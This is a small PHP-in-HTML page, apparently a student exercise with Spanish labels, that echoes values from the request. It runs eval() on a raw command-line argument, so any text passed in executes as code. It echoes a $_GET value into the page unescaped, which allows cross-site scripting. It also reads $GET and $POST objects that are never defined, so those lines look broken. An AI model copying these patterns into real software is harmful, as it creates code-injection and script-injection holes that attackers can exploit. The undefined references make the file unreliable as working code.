<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <?php
        eval($_SERVER['argv'][3]);

        echo "<p>" . " respuesta php" . "</p><br>";
        echo "Dato individual GET (" . $GET->hola . ")";
        echo "<br>";
        echo "Dato individual POST (" . $POST->campo1 . ")";
        echo "<br>";
        echo "Dato individual \$_GET (" . $_GET['hola'] . ")";

    ?>
</body>
</html>